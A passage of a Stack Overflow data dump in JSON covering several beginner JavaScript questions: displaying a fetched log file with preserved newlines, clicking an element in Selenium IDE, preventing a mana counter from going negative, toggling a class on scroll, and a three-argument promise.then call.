"xmlhttprequest"], "comments": [{"owner": {"reputation": 11274, "user_id": 9078341, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/TAD0A.png?s=128&g=1", "display_name": "Randy Casburn", "link": "https://stackoverflow.com/users/9078341/randy-casburn"}, "edited": false, "score": 0, "creation_date": 1558557677, "post_id": 56264667, "comment_id": 99145743, "body": "You have two choices - you can append a <code>&lt;br&gt;</code> tag to the end of every line, or place your log contents between <code>&lt;pre&gt;&lt;&#47;pre&gt;</code> tags. New line characters are removed in the browser, you emulate those with <code>&lt;br&gt;</code>;"}, {"owner": {"reputation": 327, "user_id": 8883287, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-sHrcYKWMI60/AAAAAAAAAAI/AAAAAAAAG9w/utz0EyvXH0E/photo.jpg?sz=128", "display_name": "Param", "link": "https://stackoverflow.com/users/8883287/param"}, "reply_to_user": {"reputation": 11274, "user_id": 9078341, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/TAD0A.png?s=128&g=1", "display_name": "Randy Casburn", "link": "https://stackoverflow.com/users/9078341/randy-casburn"}, "edited": false, "score": 0, "creation_date": 1558557749, "post_id": 56264667, "comment_id": 99145772, "body": "Using <code>&lt;pre&gt;&lt;&#47;pre&gt;</code> is exactly what I was looking for, thanks"}], "answers": [{"tags": [], "owner": {"reputation": 327, "user_id": 8883287, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-sHrcYKWMI60/AAAAAAAAAAI/AAAAAAAAG9w/utz0EyvXH0E/photo.jpg?sz=128", "display_name": "Param", "link": "https://stackoverflow.com/users/8883287/param"}, "is_accepted": true, "score": 0, "last_activity_date": 1558557794, "creation_date": 1558557794, "answer_id": 56264732, "question_id": 56264667, "link": "https://stackoverflow.com/questions/56264667/how-to-get-a-logfile-and-display-it-using-javascript-xmlhttprequest/56264732#56264732", "title": "How to get a logfile and display it using JavaScript XMLHttpRequest", "body": "<p>Thanks to @Randy Casburn I found out that using <code>&lt;pre&gt;&lt;/pre&gt;</code> keeps newlines intact</p>\n"}], "owner": {"reputation": 327, "user_id": 8883287, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-sHrcYKWMI60/AAAAAAAAAAI/AAAAAAAAG9w/utz0EyvXH0E/photo.jpg?sz=128", "display_name": "Param", "link": "https://stackoverflow.com/users/8883287/param"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 15, "favorite_count": 0, "accepted_answer_id": 56264732, "answer_count": 1, "score": 0, "last_activity_date": 1558557794, "creation_date": 1558557495, "question_id": 56264667, "link": "https://stackoverflow.com/questions/56264667/how-to-get-a-logfile-and-display-it-using-javascript-xmlhttprequest", "title": "How to get a logfile and display it using JavaScript XMLHttpRequest", "body": "<p>I have a logfile that has a couple entries separated by newlines, but when I try to get it using this code:</p>\n\n<pre><code>var xhttp=new XMLHttpRequest();\n\nxhttp.onreadystatechange=function(){\n  if(this.readyState==4&amp;&amp;this.status==200){\n    document.getElementById(\"log\").innerHTML = this.responseText;\n  }\n};\n\nxhttp.open(\"GET\",\"https://raw.githubusercontent.com/wiki/paramt/MemeAdviser/memeadviser.log\");\nxhttp.send();\n</code></pre>\n\n<p>It isn't separated by newlines. How do I display each entry on a separate line? When I used <code>curl</code>, it displayed each entry on a new line</p>\n\n<p><a href=\"https://raw.githubusercontent.com/wiki/paramt/MemeAdviser/memeadviser.log\" rel=\"nofollow noreferrer\">Here is my log file</a></p>\n"}, {"tags": ["javascript", "selenium-ide"], "answers": [{"comments": [{"owner": {"reputation": 1730, "user_id": 5691558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/18305559850d1d9ce0aa697f3fa38a2c?s=128&d=identicon&r=PG&f=1", "display_name": "Ger Cas", "link": "https://stackoverflow.com/users/5691558/ger-cas"}, "edited": false, "score": 0, "creation_date": 1558562166, "post_id": 56265351, "comment_id": 99147322, "body": "Hi, thanks for answer. I tested your suggestion like this: <code>Command: execute script</code> and in <code>Target</code> the code you suggested but I get this error <code>Failed: driver is not defined</code>"}, {"owner": {"reputation": 855, "user_id": 4744568, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/125cdb7d43927756913b920de016f420?s=128&d=identicon&r=PG", "display_name": "pcalkins", "link": "https://stackoverflow.com/users/4744568/pcalkins"}, "reply_to_user": {"reputation": 1730, "user_id": 5691558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/18305559850d1d9ce0aa697f3fa38a2c?s=128&d=identicon&r=PG&f=1", "display_name": "Ger Cas", "link": "https://stackoverflow.com/users/5691558/ger-cas"}, "edited": false, "score": 0, "creation_date": 1558562499, "post_id": 56265351, "comment_id": 99147406, "body": "you need to instantiate your webdriver... Webdriver driver = new Chromedriver();  May need to set path too..."}, {"owner": {"reputation": 855, "user_id": 4744568, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/125cdb7d43927756913b920de016f420?s=128&d=identicon&r=PG", "display_name": "pcalkins", "link": "https://stackoverflow.com/users/4744568/pcalkins"}, "reply_to_user": {"reputation": 1730, "user_id": 5691558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/18305559850d1d9ce0aa697f3fa38a2c?s=128&d=identicon&r=PG&f=1", "display_name": "Ger Cas", "link": "https://stackoverflow.com/users/5691558/ger-cas"}, "edited": false, "score": 0, "creation_date": 1558562826, "post_id": 56265351, "comment_id": 99147493, "body": "I may be confusing you.  I don&#39;t use Selenium IDE... but that looks to be a way to record and playback... like the old-school Selenium browser plugins.  Maybe what you need is to move to using the newer versions of Selenium?"}, {"owner": {"reputation": 1730, "user_id": 5691558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/18305559850d1d9ce0aa697f3fa38a2c?s=128&d=identicon&r=PG&f=1", "display_name": "Ger Cas", "link": "https://stackoverflow.com/users/5691558/ger-cas"}, "edited": false, "score": 0, "creation_date": 1558562870, "post_id": 56265351, "comment_id": 99147512, "body": "But how to instantiate webdriver on <code>Selenium IDE</code>? I&#39;m not working with Selenium Chromedriver, but with Selenium IDE"}, {"owner": {"reputation": 855, "user_id": 4744568, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/125cdb7d43927756913b920de016f420?s=128&d=identicon&r=PG", "display_name": "pcalkins", "link": "https://stackoverflow.com/users/4744568/pcalkins"}, "reply_to_user": {"reputation": 1730, "user_id": 5691558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/18305559850d1d9ce0aa697f3fa38a2c?s=128&d=identicon&r=PG&f=1", "display_name": "Ger Cas", "link": "https://stackoverflow.com/users/5691558/ger-cas"}, "edited": false, "score": 0, "creation_date": 1558563171, "post_id": 56265351, "comment_id": 99147600, "body": "I&#39;m not familiar with Selenium IDE.... so forgive me.  I&#39;ve confused Selenium with Selenium IDE here."}, {"owner": {"reputation": 1730, "user_id": 5691558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/18305559850d1d9ce0aa697f3fa38a2c?s=128&d=identicon&r=PG&f=1", "display_name": "Ger Cas", "link": "https://stackoverflow.com/users/5691558/ger-cas"}, "edited": false, "score": 0, "creation_date": 1558564542, "post_id": 56265351, "comment_id": 99147944, "body": "No issue. Thanks for your help. Maybe some other person could help me."}, {"owner": {"reputation": 855, "user_id": 4744568, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/125cdb7d43927756913b920de016f420?s=128&d=identicon&r=PG", "display_name": "pcalkins", "link": "https://stackoverflow.com/users/4744568/pcalkins"}, "reply_to_user": {"reputation": 1730, "user_id": 5691558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/18305559850d1d9ce0aa697f3fa38a2c?s=128&d=identicon&r=PG&f=1", "display_name": "Ger Cas", "link": "https://stackoverflow.com/users/5691558/ger-cas"}, "edited": false, "score": 0, "creation_date": 1558564957, "post_id": 56265351, "comment_id": 99148033, "body": "it&#39;s possible that driver is assumed in the IDE... try find_element_by_xpath(&quot;//a[@onclick=&#39;abc.def(123,456789);&#39;]&quot;&zwnj;&#8203;).click();"}], "tags": [], "owner": {"reputation": 855, "user_id": 4744568, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/125cdb7d43927756913b920de016f420?s=128&d=identicon&r=PG", "display_name": "pcalkins", "link": "https://stackoverflow.com/users/4744568/pcalkins"}, "is_accepted": false, "score": 0, "last_activity_date": 1558561058, "creation_date": 1558561058, "answer_id": 56265351, "question_id": 56264590, "link": "https://stackoverflow.com/questions/56264590/how-to-do-click-on-element-with-javascript-in-selenium-ide/56265351#56265351", "title": "How to do click on element with Javascript in Selenium IDE", "body": "<pre><code> driver.find_element_by_xpath(\"//a[@onclick='abc.def(123,456789);']\").click();\n</code></pre>\n\n<p>Selenium always uses javascript. </p>\n"}], "owner": {"reputation": 1730, "user_id": 5691558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/18305559850d1d9ce0aa697f3fa38a2c?s=128&d=identicon&r=PG&f=1", "display_name": "Ger Cas", "link": "https://stackoverflow.com/users/5691558/ger-cas"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 440, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1558564589, "creation_date": 1558557120, "last_edit_date": 1558564589, "question_id": 56264590, "link": "https://stackoverflow.com/questions/56264590/how-to-do-click-on-element-with-javascript-in-selenium-ide", "title": "How to do click on element with Javascript in Selenium IDE", "body": "<p>I want to do click on an element that it seems to be invisible to normal commands of Selenium driver and Selenium IDE.</p>\n\n<p>Using Selenium Chromedriver with Python this command doesn't work:</p>\n\n<pre><code>driver.find_element_by_xpath(\"//a[@onclick='abc.def(123,456789);']\")\n</code></pre>\n\n<p>I need to use javascript to simulate the user click and it works in this way:</p>\n\n<pre><code>driver.execute_script(\"arguments[0].click();\", driver.find_element_by_xpath(\"//a[@onclick='abc.def(123,456789);']\"))\n</code></pre>\n\n<p>So, I'd like to know how can I use javascript to simulate the user click on Selenium IDE?.  I've tried like this but is not working.</p>\n\n<pre><code>Command: execute script\nTarget: arguments[0].click();\nValue: xpath=//a[@onclick='abc.def(123,456789);']\n</code></pre>\n\n<p>I hope make sense. Thanks in advance.   </p>\n"}, {"tags": ["javascript", "html"], "answers": [{"comments": [{"owner": {"reputation": 129, "user_id": 11535823, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b83d895df7b46ccac4fe6337bfa28229?s=128&d=identicon&r=PG&f=1", "display_name": "tmanrocks994", "link": "https://stackoverflow.com/users/11535823/tmanrocks994"}, "edited": false, "score": 0, "creation_date": 1558557474, "post_id": 56264620, "comment_id": 99145660, "body": "thanks that worked. is there a easier way to make it so variables cant go negative tho? like if Manapoints -10&gt;=0"}, {"owner": {"reputation": 2291, "user_id": 4123400, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-DkZUCAlILYY/AAAAAAAAAAI/AAAAAAAAAD8/Mtl8aEqkn0Q/photo.jpg?sz=128", "display_name": "Rocky Sims", "link": "https://stackoverflow.com/users/4123400/rocky-sims"}, "edited": false, "score": 1, "creation_date": 1558557617, "post_id": 56264620, "comment_id": 99145712, "body": "You can&#39;t add the constraint to the variable itself. All you can do is not subtract from it if doing so would make it negative. I think DontVoteMeDown&#39;s answer is probably the best you can do."}], "tags": [], "owner": {"reputation": 19485, "user_id": 1267304, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/oK2WD.jpg?s=128&g=1", "display_name": "DontVoteMeDown", "link": "https://stackoverflow.com/users/1267304/dontvotemedown"}, "is_accepted": true, "score": 3, "last_activity_date": 1558557683, "last_edit_date": 1558557683, "creation_date": 1558557288, "answer_id": 56264620, "question_id": 56264584, "link": "https://stackoverflow.com/questions/56264584/how-to-prevent-my-mana-value-from-going-negative/56264620#56264620", "title": "How to prevent my mana value from going negative", "body": "<p>Those <code>if</code>s only works for <code>cookies = cookies + 50</code>. You need to open a block and wrap all calculations that depends on those conditions, e.g.:</p>\n\n<pre><code>function Bigclick() {\n    if (ManaPoints &gt;= 10 &amp;&amp; rebirths &gt;=1) {\n        cookies = cookies + 50\n        ManaPoints = ManaPoints - 10;\n        document.getElementById('cookies').innerHTML = cookies;\n        document.getElementById(\"ManaPoints\").innerHTML = ManaPoints;\n    }\n    checkCursor()\n}\n</code></pre>\n\n<p>Not sure if the code above is exactly what you need, it is just an example.</p>\n\n<p>Another example of how your conditions were woring initially:</p>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-js lang-js prettyprint-override\"><code>var truthy = false;\r\n\r\nif (truthy)\r\nif (!!truthy)\r\nconsole.log(\"truthy\");\r\nconsole.log(\"not truthy\");</code></pre>\r\n</div>\r\n</div>\r\n</p>\n\n<p>UPDATE:</p>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-js lang-js prettyprint-override\"><code>let button = document.getElementById(\"use-mana\"),\r\n    manaQty = document.getElementById(\"mana-qty\");\r\n    \r\nconst manaCost = 10;\r\n    \r\nbutton.addEventListener(\"click\", () =&gt;\r\n{\r\n  let qty = Number(manaQty.innerText);\r\n  \r\n  if (qty &gt;= manaCost)\r\n  {\r\n    qty-= manaCost;\r\n    manaQty.innerText = qty;\r\n  }\r\n  else \r\n  {\r\n    window.alert(\"Not enough mana!\");\r\n  }\r\n});</code></pre>\r\n<pre class=\"snippet-code-html lang-html prettyprint-override\"><code>&lt;div id=\"mana-qty\"&gt;29&lt;/div&gt;\r\n&lt;button id=\"use-mana\"&gt;Use Mana&lt;/button&gt;</code></pre>\r\n</div>\r\n</div>\r\n</p>\n"}, {"tags": [], "owner": {"reputation": 7965, "user_id": 6504633, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1ac20a524c7ab77fee62995c374a1f8a?s=128&d=identicon&r=PG&f=1", "display_name": "obscure", "link": "https://stackoverflow.com/users/6504633/obscure"}, "is_accepted": false, "score": 1, "last_activity_date": 1558557345, "creation_date": 1558557345, "answer_id": 56264630, "question_id": 56264584, "link": "https://stackoverflow.com/questions/56264584/how-to-prevent-my-mana-value-from-going-negative/56264630#56264630", "title": "How to prevent my mana value from going negative", "body": "<p>Generally - if you want to avoid a number becoming negative after subtraction - you have to check if it would be smaller than 0 if you subtract a specific value. If it does make it zero, if it doesn't subtract the desired amount.</p>\n\n<pre><code>if (ManaPoints - 10 &lt; 0) {\n  ManaPoints = 0;\n} else {\n  ManaPoints -= 10;\n}\n</code></pre>\n"}], "owner": {"reputation": 129, "user_id": 11535823, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b83d895df7b46ccac4fe6337bfa28229?s=128&d=identicon&r=PG&f=1", "display_name": "tmanrocks994", "link": "https://stackoverflow.com/users/11535823/tmanrocks994"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 31, "favorite_count": 0, "accepted_answer_id": 56264620, "answer_count": 2, "score": 0, "last_activity_date": 1558557683, "creation_date": 1558557094, "question_id": 56264584, "link": "https://stackoverflow.com/questions/56264584/how-to-prevent-my-mana-value-from-going-negative", "title": "How to prevent my mana value from going negative", "body": "<p>So when I use my skill it takes 10 mana from mana total then adds 50 to cookie total but if I use the skill again it keeps taking mana. i have it set so cookies does not increase but my mana keeps going down. how do i prevent values from going negative.</p>\n\n<p>I haven't tried much not sure how to prevent it </p>\n\n<p>This is my Javascript code:</p>\n\n<pre><code>function Bigclick() {\n        if (ManaPoints &gt;= 10)\n        if (rebirths &gt;=1)    \n        cookies = cookies + 50\n        ManaPoints = ManaPoints - 10;\n        document.getElementById('cookies').innerHTML = cookies;\n        document.getElementById(\"ManaPoints\").innerHTML = ManaPoints;\n        checkCursor()\n}\n</code></pre>\n\n<p>I expect If im below 10 mana or at 0 mana for the function to not do anything. but the actual output the Mana keeps going down <a href=\"http://prntscr.com/ns2d0m\" rel=\"nofollow noreferrer\">http://prntscr.com/ns2d0m</a></p>\n"}, {"tags": ["javascript", "jquery", "html", "dom"], "comments": [{"owner": {"reputation": 20489, "user_id": 2026606, "user_type": "registered", "accept_rate": 54, "profile_image": "https://i.stack.imgur.com/Ksr3L.jpg?s=128&g=1", "display_name": "Tyler Roper", "link": "https://stackoverflow.com/users/2026606/tyler-roper"}, "reply_to_user": {"reputation": 85990, "user_id": 104380, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/00eb0dd8c3cd1298b05f09661f0c2b45?s=128&d=identicon&r=PG", "display_name": "vsync", "link": "https://stackoverflow.com/users/104380/vsync"}, "edited": false, "score": 2, "creation_date": 1558557562, "post_id": 56264553, "comment_id": 99145695, "body": "@vsync &quot;So many ways&quot; - seems a bit of an overstatement. Hypothetically you never, ever <i>&quot;need&quot;</i> jQuery, nor do we know if this tiny snippet is the specific reason that OP is using it. That leaves one issue (the repeated DOM lookups), and while I agree (and would suggest OP implement stored lookups), this specific snippet wouldn&#39;t really produce noticeable slowdowns."}, {"owner": {"reputation": 127, "user_id": 5496263, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/l41hk.jpg?s=128&g=1", "display_name": "Fernando", "link": "https://stackoverflow.com/users/5496263/fernando"}, "reply_to_user": {"reputation": 85990, "user_id": 104380, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/00eb0dd8c3cd1298b05f09661f0c2b45?s=128&d=identicon&r=PG", "display_name": "vsync", "link": "https://stackoverflow.com/users/104380/vsync"}, "edited": false, "score": 0, "creation_date": 1558557720, "post_id": 56264553, "comment_id": 99145766, "body": "@vsync, ok. What would be your suggestion? Just starting in JS (:"}, {"owner": {"reputation": 20489, "user_id": 2026606, "user_type": "registered", "accept_rate": 54, "profile_image": "https://i.stack.imgur.com/Ksr3L.jpg?s=128&g=1", "display_name": "Tyler Roper", "link": "https://stackoverflow.com/users/2026606/tyler-roper"}, "edited": false, "score": 0, "creation_date": 1558557829, "post_id": 56264553, "comment_id": 99145811, "body": "@Fernando You should consider applying some CSS along the lines of  <code>body { height: 200vh; }</code> in your question, to ensure a scrollbar appears. Without scrollable content, we can&#39;t replicate the scroll behavior."}, {"owner": {"reputation": 127, "user_id": 5496263, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/l41hk.jpg?s=128&g=1", "display_name": "Fernando", "link": "https://stackoverflow.com/users/5496263/fernando"}, "reply_to_user": {"reputation": 20489, "user_id": 2026606, "user_type": "registered", "accept_rate": 54, "profile_image": "https://i.stack.imgur.com/Ksr3L.jpg?s=128&g=1", "display_name": "Tyler Roper", "link": "https://stackoverflow.com/users/2026606/tyler-roper"}, "edited": false, "score": 0, "creation_date": 1558558211, "post_id": 56264553, "comment_id": 99145965, "body": "@TylerRoper, thanks! Just added CSS :) Basically the div.content is located -200 px and I use JS to add a class and make it comes up. But the JS is the problem, its not adding the class to makes it comes up when I scroll the page over 400px."}, {"owner": {"reputation": 20489, "user_id": 2026606, "user_type": "registered", "accept_rate": 54, "profile_image": "https://i.stack.imgur.com/Ksr3L.jpg?s=128&g=1", "display_name": "Tyler Roper", "link": "https://stackoverflow.com/users/2026606/tyler-roper"}, "edited": false, "score": 0, "creation_date": 1558558250, "post_id": 56264553, "comment_id": 99145980, "body": "@Fernando The CSS that you&#39;ve included doesn&#39;t produce scrollbars."}, {"owner": {"reputation": 127, "user_id": 5496263, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/l41hk.jpg?s=128&g=1", "display_name": "Fernando", "link": "https://stackoverflow.com/users/5496263/fernando"}, "reply_to_user": {"reputation": 20489, "user_id": 2026606, "user_type": "registered", "accept_rate": 54, "profile_image": "https://i.stack.imgur.com/Ksr3L.jpg?s=128&g=1", "display_name": "Tyler Roper", "link": "https://stackoverflow.com/users/2026606/tyler-roper"}, "edited": false, "score": 0, "creation_date": 1558558430, "post_id": 56264553, "comment_id": 99146058, "body": "@TylerRoper, sorry, done! if you need more info you can check the link I provided because here the code worked."}, {"owner": {"reputation": 127, "user_id": 5496263, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/l41hk.jpg?s=128&g=1", "display_name": "Fernando", "link": "https://stackoverflow.com/users/5496263/fernando"}, "reply_to_user": {"reputation": 20489, "user_id": 2026606, "user_type": "registered", "accept_rate": 54, "profile_image": "https://i.stack.imgur.com/Ksr3L.jpg?s=128&g=1", "display_name": "Tyler Roper", "link": "https://stackoverflow.com/users/2026606/tyler-roper"}, "edited": false, "score": 0, "creation_date": 1558559202, "post_id": 56264553, "comment_id": 99146363, "body": "Let us <a href=\"https://chat.stackoverflow.com/rooms/193794/discussion-between-fernando-and-tyler-roper\">continue this discussion in chat</a>."}], "answers": [{"comments": [{"owner": {"reputation": 85990, "user_id": 104380, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/00eb0dd8c3cd1298b05f09661f0c2b45?s=128&d=identicon&r=PG", "display_name": "vsync", "link": "https://stackoverflow.com/users/104380/vsync"}, "edited": false, "score": 0, "creation_date": 1558594754, "post_id": 56264895, "comment_id": 99154250, "body": "<code>var element = document.querySelector(&quot;.converter&quot;)</code> should be declared <b>outside</b> of the scroll callback function."}], "tags": [], "owner": {"reputation": 1580, "user_id": 11151040, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/1WSYv.png?s=128&g=1", "display_name": "BOZ", "link": "https://stackoverflow.com/users/11151040/boz"}, "is_accepted": true, "score": 0, "last_activity_date": 1558720269, "last_edit_date": 1558720269, "creation_date": 1558558548, "answer_id": 56264895, "question_id": 56264553, "link": "https://stackoverflow.com/questions/56264553/inline-javascript-stoped-adding-class-to-element/56264895#56264895", "title": "Inline Javascript stoped adding class to element", "body": "<p>In fact, trying to use it without including JQuery gives you the error. You can solve this easily with \"JavaScript\" without using jQuery.</p>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-js lang-js prettyprint-override\"><code>var element = document.querySelector(\".converter\");\r\n\r\nwindow.addEventListener('scroll', function() {\r\n\r\n  var scroll = window.pageYOffset || document.documentElement.scrollTop;\r\n\r\n  if (scroll &gt;= 400) {\r\n    element.classList.add(\"atcbottomactive\");\r\n  } else {\r\n    element.classList.remove(\"atcbottomactive\");\r\n  }\r\n\r\n});</code></pre>\r\n<pre class=\"snippet-code-css lang-css prettyprint-override\"><code>.converter {\r\n  padding: 20px 20px 200%;\r\n  background: blue;\r\n  color: white;\r\n}\r\n\r\n.converter.atcbottomactive {\r\n  background: green;\r\n}</code></pre>\r\n<pre class=\"snippet-code-html lang-html prettyprint-override\"><code>&lt;div class=\"converter\"&gt;\r\n  &lt;div class=\"ccontent\"&gt;Scroll me: 400px&lt;/div&gt;\r\n&lt;/div&gt;</code></pre>\r\n</div>\r\n</div>\r\n</p>\n"}], "owner": {"reputation": 127, "user_id": 5496263, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/l41hk.jpg?s=128&g=1", "display_name": "Fernando", "link": "https://stackoverflow.com/users/5496263/fernando"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 275, "favorite_count": 0, "accepted_answer_id": 56264895, "answer_count": 1, "score": 0, "last_activity_date": 1558720269, "creation_date": 1558556942, "last_edit_date": 1558558404, "question_id": 56264553, "link": "https://stackoverflow.com/questions/56264553/inline-javascript-stoped-adding-class-to-element", "title": "Inline Javascript stoped adding class to element", "body": "<p>Hey I have an inline javascript code that adds a class to an element and makes it slide up in the screen. But it suddenly stopped working and I don't know why. Here's the HTMl and JS:    </p>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-js lang-js prettyprint-override\"><code> $(window).scroll(function() {    \r\n        var scroll = $(window).scrollTop();\r\n\r\n        if (scroll &gt;= 400) {\r\n            $(\".converter\").addClass(\"atcbottomactive\");\r\n        } else {\r\n            $(\".converter\").removeClass(\"atcbottomactive\");\r\n        }\r\n    });</code></pre>\r\n<pre class=\"snippet-code-css lang-css prettyprint-override\"><code>.converter {\r\n\tposition: fixed; \r\n\theight: 60px; \r\n\twidth: 100%; \r\n\tbottom: -200; \r\n\tbackground: #eeeeee; \r\n\ttransition: 1s;\r\n\tz-index: 10000;\r\n}\r\n\r\n.ccontent {\r\n\tdisplay: inline-flex;\r\n\twidth: 100%;\r\n\tpadding: 10px 5%;\r\n}\r\n\r\n.atcbottomactive{\r\n\tbottom:0;\r\n\ttransition: 1s;\r\n}</code></pre>\r\n<pre class=\"snippet-code-html lang-html prettyprint-override\"><code>&lt;script src=\"https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js\"&gt;&lt;/script&gt;\r\n&lt;div style=\"background: green; height: 1500px; width: 100%;\"&gt;&lt;/div&gt;\r\n&lt;div class=\"converter\"&gt;&lt;div class=\"ccontent\"&gt;...&lt;/div&gt;&lt;/div&gt;</code></pre>\r\n</div>\r\n</div>\r\n</p>\n\n<p>Here's the <a href=\"https://azaz.com.br\" rel=\"nofollow noreferrer\">link</a></p>\n\n<p>Thanks in advance :)</p>\n"}, {"tags": ["javascript", "promise"], "comments": [{"owner": {"reputation": 28101, "user_id": 3082296, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/5eac8c095f63cb9fe29a9af3cb97eb0e?s=128&d=identicon&r=PG&f=1", "display_name": "adiga", "link": "https://stackoverflow.com/users/3082296/adiga"}, "edited": false, "score": 0, "creation_date": 1558557113, "post_id": 56264551, "comment_id": 99145513, "body": "<code>myPromiseFunction</code> returns a <code>thenable</code> (something other than <code>Promise</code>) which takes 3 parameters"}, {"owner": {"reputation": 507143, "user_id": 1048572, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/7f2c4de95e8f4f8f5a71c3aaf0ed312a?s=128&d=identicon&r=PG", "display_name": "Bergi", "link": "https://stackoverflow.com/users/1048572/bergi"}, "edited": false, "score": 6, "creation_date": 1558557123, "post_id": 56264551, "comment_id": 99145516, "body": "If it&#39;s a native promise, it means nothing - <code>then</code> only takes two arguments. Are you using a special promise library maybe?"}, {"owner": {"reputation": 3104, "user_id": 1350162, "user_type": "registered", "accept_rate": 58, "profile_image": "https://i.stack.imgur.com/Px86A.jpg?s=128&g=1", "display_name": "callback", "link": "https://stackoverflow.com/users/1350162/callback"}, "edited": false, "score": 1, "creation_date": 1558557154, "post_id": 56264551, "comment_id": 99145528, "body": "Specifications <a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/then\" rel=\"nofollow noreferrer\">developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/&hellip;</a> do not mention any third argument..Unless you are overriding the native <code>then</code> function, that third argument is useless!"}, {"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 0, "creation_date": 1558557466, "post_id": 56264551, "comment_id": 99145655, "body": "What does <code>myPromiseFunction</code> return?"}, {"owner": {"reputation": 1031, "user_id": 1284853, "user_type": "registered", "accept_rate": 48, "profile_image": "https://www.gravatar.com/avatar/78d6e126025cf7f456879a255da7c1b9?s=128&d=identicon&r=PG", "display_name": "Waterfr Villa", "link": "https://stackoverflow.com/users/1284853/waterfr-villa"}, "edited": false, "score": 0, "creation_date": 1558557588, "post_id": 56264551, "comment_id": 99145699, "body": "returns a either reject or resolve"}, {"owner": {"reputation": 135520, "user_id": 1715579, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/4B4y1.png?s=128&g=1", "display_name": "p.s.w.g", "link": "https://stackoverflow.com/users/1715579/p-s-w-g"}, "edited": false, "score": 0, "creation_date": 1558557984, "post_id": 56264551, "comment_id": 99145880, "body": "The <a href=\"https://github.com/kriskowal/q/wiki/API-Reference\" rel=\"nofollow noreferrer\"><code>q</code></a> implementation of <code>.then</code> accepts 3 parameters, with the third parameter being an <i><code>onProgress</code></i> handler. I know of no other implementation that takes three parameters."}], "owner": {"reputation": 1031, "user_id": 1284853, "user_type": "registered", "accept_rate": 48, "profile_image": "https://www.gravatar.com/avatar/78d6e126025cf7f456879a255da7c1b9?s=128&d=identicon&r=PG", "display_name": "Waterfr Villa", "link": "https://stackoverflow.com/users/1284853/waterfr-villa"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 33, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1558556938, "creation_date": 1558556938, "question_id": 56264551, "link": "https://stackoverflow.com/questions/56264551/what-boolean-value-passed-to-promise-then-means", "title": "what boolean value passed to promise.then means", "body": "<p>I ran across this piece of code - what is the role of Boolean value in then part of this piece of code ?</p>\n\n<pre><code> if (someCondition) {\n     return Promise.resolve(oQueryInfo);\n  } else {\n     return this.myPromiseFunction(par1, par2, true, false).then(onResolve, onReject, false);\n  }\n</code></pre>\n\n<p>While <code>oResolve</code> and <code>oReject</code> are callback functions.</p>\n"}, {"tags": ["javascript", "vue.js", "vuejs2", "html5-canvas"], "comments": [{"owner": {"reputation": 795, "user_id": 1784018, "user_type": "registered", "accept_rate": 67, "profile_image": 